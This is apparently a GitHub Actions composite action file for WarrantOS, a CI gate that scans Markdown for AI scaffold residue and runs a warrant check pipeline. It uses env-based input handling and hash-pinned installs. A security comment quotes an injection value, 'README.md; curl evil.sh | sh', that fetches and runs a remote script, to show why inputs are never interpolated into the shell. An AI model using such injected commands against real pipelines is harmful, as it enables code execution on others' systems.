name: "WarrantOS"
description: >-
  Gate AI-assisted documents in CI: block scaffold and conversational residue
  (warrantos slop) and run the full warrant pipeline (warrantos check --ci).
author: "Juan Vega"

branding:
  icon: shield
  color: green

inputs:
  paths:
    description: >-
      Newline-delimited files or directories to scan (one path per line, so
      filenames containing spaces are safe). Directories are walked for
      Markdown files in check mode; slop mode passes them through as-is.
      A blank value scans the current directory.
    required: false
    default: "."
  profile:
    description: >-
      Layer 7 G1 boundary profile for check mode (final-prose, brief-light,
      paper-full, prompt-template, audit, methodology, consultation_report,
      changelog).
    required: false
    default: "brief-light"
  mode:
    description: >-
      Which gate to run: "slop" (scaffold-residue scan), "check" (full
      pipeline with --ci), or "both".
    required: false
    default: "slop"
  fail-over:
    description: >-
      Slop-score threshold passed to `warrantos slop --fail-over`. The step
      fails when the score exceeds this value. Default 0: any residue fails.
    required: false
    default: "0"
  python-version:
    description: "Python version to set up (3.11 to 3.13 are supported)."
    required: false
    default: "3.12"

# Security posture of the run blocks below:
#
# 1. No `${{ inputs.* }}` interpolation inside any `run:` block. Every user
#    input reaches the shell exclusively through `env:` variables and is
#    expanded by bash with full quoting, so a malicious input value
#    (`README.md; curl evil.sh | sh`) is only ever data, never code.
# 2. `paths` is newline-delimited and parsed with `IFS= read -r`, so
#    filenames containing spaces (or any character except newline) survive
#    intact and multi-path inputs need no shell-sensitive separator.
# 3. The install is hash-pinned: `pip install --require-hashes` against the
#    committed action-requirements.txt (generated with pip-compile
#    --generate-hashes), so a compromised or substituted PyPI artefact
#    cannot execute in the consumer's workflow.
runs:
  using: "composite"
  steps:
    - uses: actions/setup-python@a26af69be951a213d495a4c3e4e4022e16d87065 # v5
      with:
        python-version: ${{ inputs.python-version }}

    - name: Install WarrantOS from PyPI (version- and hash-pinned)
      shell: bash
      run: |
        set -euo pipefail
        python -m pip install --require-hashes --requirement \
          "${GITHUB_ACTION_PATH}/action-requirements.txt"

    - name: Run the slop gate (scaffold and conversational residue)
      if: ${{ inputs.mode == 'slop' || inputs.mode == 'both' }}
      shell: bash
      env:
        WARRANTOS_INPUT_PATHS: ${{ inputs.paths }}
        WARRANTOS_INPUT_FAIL_OVER: ${{ inputs.fail-over }}
      run: |
        set -euo pipefail
        targets=()
        while IFS= read -r p; do
          [ -n "$p" ] || continue
          targets+=("$p")
        done <<< "$WARRANTOS_INPUT_PATHS"
        if [ "${#targets[@]}" -eq 0 ]; then
          targets=(".")
        fi
        warrantos slop "${targets[@]}" --fail-over "$WARRANTOS_INPUT_FAIL_OVER"

    - name: Run the full check pipeline (--ci exits non-zero on HOLD/BLOCK/NOT_ASSESSABLE)
      if: ${{ inputs.mode == 'check' || inputs.mode == 'both' }}
      shell: bash
      env:
        WARRANTOS_INPUT_PATHS: ${{ inputs.paths }}
        WARRANTOS_INPUT_PROFILE: ${{ inputs.profile }}
      run: |
        set -uo pipefail
        targets=()
        while IFS= read -r p; do
          [ -n "$p" ] || continue
          targets+=("$p")
        done <<< "$WARRANTOS_INPUT_PATHS"
        if [ "${#targets[@]}" -eq 0 ]; then
          targets=(".")
        fi
        status=0
        for p in "${targets[@]}"; do
          if [ -d "$p" ]; then
            while IFS= read -r -d '' f; do
              echo "::group::warrantos check $f"
              warrantos check "$f" --profile "$WARRANTOS_INPUT_PROFILE" --ci || status=1
              echo "::endgroup::"
            done < <(find "$p" -type f -name '*.md' -not -path '*/.*' -print0)
          else
            warrantos check "$p" --profile "$WARRANTOS_INPUT_PROFILE" --ci || status=1
          fi
        done
        exit "$status"
